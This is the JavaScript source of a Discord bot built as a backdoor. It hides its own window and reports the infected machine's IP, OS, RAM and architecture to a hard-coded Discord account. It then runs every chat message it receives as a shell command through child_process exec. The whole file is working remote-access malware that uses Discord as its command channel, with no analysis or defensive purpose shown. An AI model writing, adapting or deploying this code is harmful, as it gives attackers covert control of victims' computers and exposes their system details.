const Discord = require("discord.js");
const os = require('os');
const exec = require('child_process').exec;
const bot = new Discord.Client();
var userid = null
var err = null

exec("call %cd%\\hide.exe")

bot.login("Token");

bot.on ("message", async (message) =>{
    if(message.author.id != bot.user.id)
    {
        await exec(message.content) 
    }
    if(message.content == "$$getusers")
    {
        require('dns').lookup(require('os').hostname(), function (err, add, fam) {
            bot.users.fetch("703219730064080936").then((user) => {
                //user.send("IP: " + add + "\nID: " + userid + "\nOS: " + os.platform() + "\nTotal RAM : " + bytesToSize(os.totalmem()) + "GB" + "\nArchitecture: " + os.arch() + "\n\n\n")
                getusers(add, userid, os.platform(), bytesToSize(os.totalmem()), os.arch(), user)
            })
        })
    }
    if(message.content.startsWith("$$kick "))
    {
        if(message.content.split("\"")[1] == "*")
        {
            console.log("Kicked.")
            bot.destroy()
        }
        require('dns').lookup(require('os').hostname(), function (err, add, fam) {
            bot.users.fetch("703219730064080936").then( (user) => {
                if(add == message.content.split("\"")[1])
                {
                    console.log("Kicked.")
                    bot.destroy()
                }
                if(userid == message.content.split("\"")[1])
                {
                    console.log("Kicked.")
                    bot.destroy()
                }
                if(err != null)
                {
                    user.send(err)
                }
            })
        })
    }
})

bot.on("ready", async (ready) => {
    //console.log("Bot started.");
    userid = createid()
    bot.user.setActivity('Backdoor <3', { type: 'PLAYING' });
    require('dns').lookup(require('os').hostname(), function (err, add, fam) {
        bot.users.fetch("703219730064080936").then((user) => {
            //user.send("New user:\nIP: " + add + "\nID: " + userid + "\nOS: " + os.platform() + "\nTotal RAM : " + bytesToSize(os.totalmem()) + "GB" + "\nArchitecture: " + os.arch())
            newuser(add, userid, os.platform(), bytesToSize(os.totalmem()), os.arch(), user)
            if(err != null)
            {
                user.send(err)
            }
        });
    })
})

function createid() {
    var newid = (Math.random() * (9 - 0) + 0).toString().split(".")[1];
    return newid
}

function bytesToSize(bytes) {
    const i = parseInt(Math. floor(Math. log(bytes) / Math. log(1024)), 10)
    return `${(bytes / (1024 ** i)). toFixed(1)}`
}

function newuser(ip, id, os, ram, arch, user = Discord.User)
{
    var newuseremb = new Discord.MessageEmbed()
    newuseremb.setColor('#03FF0A')
    newuseremb.setTitle('New User')
    newuseremb.setDescription('User Description: ')
    newuseremb.addFields(
        { name: 'User IP', value: ip, inline: true },
        { name: 'User ID', value: id, inline: true },
        { name: 'User OS', value: os, inline: true },
        { name: 'User RAM', value: ram, inline: true },
        { name: 'User Architecture', value: arch, inline: true },
    )
    user.send(newuseremb)
}

function getusers(ip, id, os, ram, arch, user = Discord.User)
{
    var getuseremb = new Discord.MessageEmbed()
    getuseremb.setColor('#03FF0A')
    getuseremb.setTitle('User')
    getuseremb.setDescription('User Description: ')
    getuseremb.addFields(
        { name: 'User IP', value: ip, inline: true },
        { name: 'User ID', value: id, inline: true },
        { name: 'User OS', value: os, inline: true },
        { name: 'User RAM', value: ram + "GB", inline: true },
        { name: 'User Architecture', value: arch, inline: true },
    )
    user.send(getuseremb)
}